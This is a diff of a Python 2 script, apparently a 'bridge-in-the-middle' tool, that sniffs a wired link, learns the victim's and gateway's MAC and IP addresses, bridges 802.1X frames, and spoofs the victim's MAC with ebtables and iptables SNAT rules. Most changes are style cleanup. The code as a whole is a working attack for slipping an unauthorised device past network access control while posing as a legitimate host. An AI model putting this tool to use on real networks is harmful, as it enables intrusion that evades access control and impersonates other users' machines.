@@ -7,21 +7,20 @@ import os
 import time
 import argparse
 
-import string
 import struct
 import re
 from threading import Thread
 import socket
 
 import pcapy
-from pcapy import findalldevs, open_live
+from pcapy import open_live
 import impacket
 import impacket.ImpactPacket
-from impacket.ImpactDecoder import EthDecoder, LinuxSLLDecoder, IPDecoder
+from impacket.ImpactDecoder import EthDecoder, LinuxSLLDecoder
 
 
 class DecoderThread(Thread):
-    def __init__(self, pcapObj,subnet,arptable):
+    def __init__(self, pcapObj, subnet, arptable):
         # Query the type of the link and instantiate a decoder accordingly.
         datalink = pcapObj.datalink()
         if pcapy.DLT_EN10MB == datalink:
@@ -35,7 +34,6 @@ class DecoderThread(Thread):
         self.subnet = subnet
         self.arptable = arptable
         Thread.__init__(self)
-        #super(Thread, self).__init__()
 
     def run(self):
         # Sniff ad infinitum.
@@ -45,10 +43,9 @@ class DecoderThread(Thread):
     def packetHandler(self, hdr, data):
         e = self.decoder.decode(data)
         if e.get_ether_type() == impacket.ImpactPacket.IP.ethertype:
-            #print e.child().get_ip_src()
             ip = e.child()
             ttl = ip.get_ip_ttl()
-            ## Uneven but not 1 or 255 ttl means it's probably coming from a router ##
+            # Uneven but not 1 or 255 ttl means it's probably coming from a router
             if (ttl % 2) > 0 and ttl > 1 and ttl != 255:
                 self.subnet.gatewaymac = e.get_ether_shost()
                 self.subnet.sourcemac = e.get_ether_dhost()
@@ -66,31 +63,27 @@ class DecoderThread(Thread):
                 self.arptable.registeraddress(arp.get_ar_spa(), arp.as_hrd(arp.get_ar_sha()))
 
 
-class ArpTable():
+class ArpTable:
     table = {}
 
-    def registeraddress(self,ip_array, hw_address):
+    def registeraddress(self, ip_array, hw_address):
         ip = self.printip(ip_array)
         if ip != "0.0.0.0":
             self.table[ip] = hw_address
             print "%s : %s" % (ip, hw_address)
 
-    def printip(self,ip_array):
+    def printip(self, ip_array):
         ip_string = socket.inet_ntoa(struct.pack('BBBB', *ip_array))
         return ip_string
 
     def updatekernel(self):
         for ip, mac in self.table.iteritems():
-            p = os.popen("arp -i mibr -s %s %s" % (ip, mac))
-            result = p.read()
-            p.close()
-            p = os.popen("ip route add %s/32 dev mibr" % ip)
-            result = p.read()
-            p.close()
+            os.system("arp -i mibr -s %s %s" % (ip, mac))
+            os.system("ip route add %s/32 dev mibr" % ip)
 
 
-## Only supports /24 or smaller
-class Subnet():
+# Only supports /24 or smaller
+class Subnet:
     sourcemac = None
     gatewaymac = None
     subnet = None
@@ -99,12 +92,10 @@ class Subnet():
     sourceaddress = None
     gatewayaddress = ""
 
-    confidence = 0
-
-    def registeraddress(self,ip_array):
+    def registeraddress(self, ip_array):
         if self.printip(ip_array) == "0.0.0.0":
             return False
-        if(ip_array[0] == 169):
+        if ip_array[0] == 169:
             return False
         if self.checksubnet(ip_array):
             if self.minaddress is None or self.minaddress[3] > ip_array[3]:
@@ -115,8 +106,8 @@ class Subnet():
             print self.printip(ip_array)
             print "[!] Error, duplicate or big subnet detected"
 
-    def checksubnet(self,ip_array):
-        if self.subnet == None:
+    def checksubnet(self, ip_array):
+        if self.subnet is None:
             self.subnet = ip_array
             return True
         if ip_array[0] == self.subnet[0] and ip_array[1] == self.subnet[1]:
@@ -124,7 +115,7 @@ class Subnet():
         else:
             return False
 
-    def printip(self,ip_array):
+    def printip(self, ip_array):
         ip_string = socket.inet_ntoa(struct.pack('BBBB', *ip_array))
         return ip_string
 
@@ -133,7 +124,7 @@ class Subnet():
             bits = 0
             discovered_hosts = self.maxaddress[3] - self.minaddress[3] + 1
             hosts = 0
-            while(hosts < discovered_hosts and bits <= 8):
+            while hosts < discovered_hosts and bits <= 8:
                 bits += 1
                 hosts = 2**bits
             return bits
@@ -143,8 +134,7 @@ class Subnet():
     def get_gatewaymac(self):
         ethernet = impacket.ImpactPacket.Ethernet()
         temp = ethernet.as_eth_addr(self.gatewaymac)
-        temp = re.sub(r':(\d):',r':0\1:', temp)
-        return temp
+        return re.sub(r':(\d):', r':0\1:', temp)
 
     def get_sourcemac(self):
         ethernet = impacket.ImpactPacket.Ethernet()
@@ -157,9 +147,9 @@ class Subnet():
         if self.minaddress and self.maxaddress:
             output += "cidr bits: %i\n" % self.getcidr()
 
-
         if self.sourcemac and self.gatewaymac:
-            output += "source: %s gateway: %s\n" % (ethernet.as_eth_addr(self.sourcemac), ethernet.as_eth_addr(self.gatewaymac))
+            output += "source: %s gateway: %s\n" %\
+                      (ethernet.as_eth_addr(self.sourcemac), ethernet.as_eth_addr(self.gatewaymac))
 
         if self.sourceaddress:
             output += "source ip: %s gateway ip: %s\n" % (self.sourceaddress, self.gatewayaddress)
@@ -170,14 +160,14 @@ class Subnet():
             return header + output
 
 
-## Create ebtables, arptables and iptables rules based on a subnet object
-class Netfilter():
+# Create ebtables, arptables and iptables rules based on a subnet object
+class Netfilter:
     subnet = None
     bridge = None
 
     switchsidemac = None
     radiosilence = False
-    gatewayinterface = "eth9"
+    gatewayinterface = "ethX"
     bridgeinterface = "mibr"
     bridgeip = "169.254.66.77"
 
@@ -192,14 +182,16 @@ class Netfilter():
         os.system("ebtables -A OUTPUT -j DROP")
         os.system("arptables -A OUTPUT -j DROP")
         print "searching for mac: %s ..." % subnet.get_gatewaymac()
-        f=os.popen("brctl showmacs %s | grep %s | awk '{print $1}'" % (self.bridgeinterface, subnet.get_gatewaymac()))
-        portnumber =  f.read().rstrip()
+        f = os.popen("brctl showmacs %s | grep %s | awk '{print $1}'" %
+                     (self.bridgeinterface, subnet.get_gatewaymac()))
+        portnumber = f.read().rstrip()
         f.close()
-        if(portnumber == ""):
+        if portnumber == "":
             print "portnumber not found bailing"
             return False
         print "portnumber is: %s" % portnumber
-        run = "brctl showstp %s | grep '(%s)' | head -n1 | awk '{print $1}'" % (self.bridgeinterface, portnumber)
+        run = "brctl showstp %s | grep '(%s)' | head -n1 | awk '{print $1}'" % \
+              (self.bridgeinterface, portnumber)
         print run
 
         x = os.popen(run)
@@ -207,7 +199,7 @@ class Netfilter():
         x.close()
         interface = interface.rstrip()
         print "got interface: %s .." % interface
-        if(interface == ""):
+        if interface == "":
             print "error getting interface is the bridge setup right?"
             return False
         print "switchside interface: %s" % interface
@@ -221,14 +213,19 @@ class Netfilter():
         os.system("macchanger -m %s %s" % (self.switchsidemac, bridge.bridgename))
         print "Updating netfilter"
         os.system("ip addr add 169.254.66.77/24 dev mibr")
-        os.system("ebtables -t nat -A POSTROUTING -s %s -o %s -j snat --snat-arp --to-src %s" % (self.switchsidemac, self.gatewayinterface, self.subnet.get_sourcemac()))
-        os.system("ebtables -t nat -A POSTROUTING -s %s -o %s -j snat --snat-arp --to-src %s" % (self.switchsidemac, self.bridgeinterface, self.subnet.get_sourcemac()))
+        os.system("ebtables -t nat -A POSTROUTING -s %s -o %s -j snat --snat-arp --to-src %s" %
+                  (self.switchsidemac, self.gatewayinterface, self.subnet.get_sourcemac()))
+        os.system("ebtables -t nat -A POSTROUTING -s %s -o %s -j snat --snat-arp --to-src %s" %
+                  (self.switchsidemac, self.bridgeinterface, self.subnet.get_sourcemac()))
 
         os.system("arp -s -i %s 169.254.66.55 %s" % (self.bridgeinterface, self.subnet.get_gatewaymac()))
         print "[*] Setting up layer 3 NAT"
-        os.system("iptables -t nat -A POSTROUTING -o %s -s 169.254.0.0/16 -p tcp -j SNAT --to %s:61000-62000" % (self.bridgeinterface,  self.subnet.sourceaddress ) )
-        os.system("iptables -t nat -A POSTROUTING -o %s -s 169.254.0.0/16 -p udp -j SNAT --to %s:61000-62000" % (self.bridgeinterface,  self.subnet.sourceaddress ) )
-        os.system("iptables -t nat -A POSTROUTING -o %s -s 169.254.0.0/16 -p icmp -j SNAT --to %s" % (self.bridgeinterface,  self.subnet.sourceaddress ) )
+        os.system("iptables -t nat -A POSTROUTING -o %s -s 169.254.0.0/16 -p tcp -j SNAT --to %s:61000-62000" %
+                  (self.bridgeinterface,  self.subnet.sourceaddress))
+        os.system("iptables -t nat -A POSTROUTING -o %s -s 169.254.0.0/16 -p udp -j SNAT --to %s:61000-62000" %
+                  (self.bridgeinterface,  self.subnet.sourceaddress))
+        os.system("iptables -t nat -A POSTROUTING -o %s -s 169.254.0.0/16 -p icmp -j SNAT --to %s" %
+                  (self.bridgeinterface,  self.subnet.sourceaddress))
         if not self.radiosilence:
             os.system("ebtables -D OUTPUT -j DROP")
             os.system("arptables -D OUTPUT -j DROP")
@@ -236,7 +233,7 @@ class Netfilter():
         os.system("ip route add default via 169.254.66.55 dev mibr")
 
 
-class Bridge():
+class Bridge:
     subnet = None
     bridgename = None
 
@@ -252,6 +249,8 @@ class Bridge():
             if interface != bridgename:
                 os.system("brctl addif %s %s" % (bridgename, interface))
             os.system("ip link set %s up promisc on" % interface)
+
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
         # Allow 802.1X traffic to pass the bridge
         os.system("echo 8 > /sys/class/net/mibr/bridge/group_fwd_mask")
@@ -279,11 +278,11 @@ def main():
     subnet = Subnet()
     arptable = ArpTable()
     # Start sniffing thread and finish main thread.
-    thread = DecoderThread(p,subnet,arptable)
+    thread = DecoderThread(p, subnet, arptable)
     thread.start()
 
     netfilter = Netfilter(subnet, bridge)
-    while(1):
+    while True:
         if subnet.sourceaddress and subnet.gatewaymac and subnet.sourcemac:
             print subnet
 
@@ -292,41 +291,31 @@ def main():
         else:
             print "not enough info..."
             print subnet
-	    time.sleep(20)
+        time.sleep(20)
 
-    # setup routing and dhcp on builtin ethernet
-    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-    #os.system("ifconfig wlan0 169.254.44.44/24")
-    #os.system("ifconfig wlan0 up")
-    #os.system("/usr/sbin/dhcpd -4 -pf /run/dhcpd4.pid wlan0")
-    #os.system("udhcpd /etc/udhcpd-wlan0.conf")
-    #os.system("/usr/local/bin/hostapd -B /etc/hostapd/hostapd.conf")
-
-    time.sleep(5)
-
-    ## arp setup ##
+    # arp setup
     try:
-		while(1):
-		    f = open('/root/subnetinfo', 'w')
-		    f.write(str(subnet))
-		    f.close()
+        while True:
+            f = open('/root/subnetinfo', 'w')
+            f.write(str(subnet))
+            f.close()
 
-		    arptable.updatekernel()
+            arptable.updatekernel()
 
-		    time.sleep(20)
+            time.sleep(20)
     except KeyboardInterrupt:
-        pass # handle ctrl-c
+        pass  # handle ctrl-c
 
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='BitM')
-    parser.add_argument('ifaces', metavar="IFACE", nargs="*",
-                        default=["eth1", "eth2"], help='Two interfaces')
+    parser.add_argument('ifaces', metavar='IFACE', nargs='*',
+                        default=['eth1', 'eth2'], help='Two interfaces')
     parser.add_argument('-6', '--enable-ipv6', action='store_true')
     args = parser.parse_args()
 
     if len(args.ifaces) not in (0, 2):
-        parser.error('Either give two interfaces or none to use the ' +\
+        parser.error('Either give two interfaces or none to use the ' +
                      'default "eth1 eth2"')
 
     main()
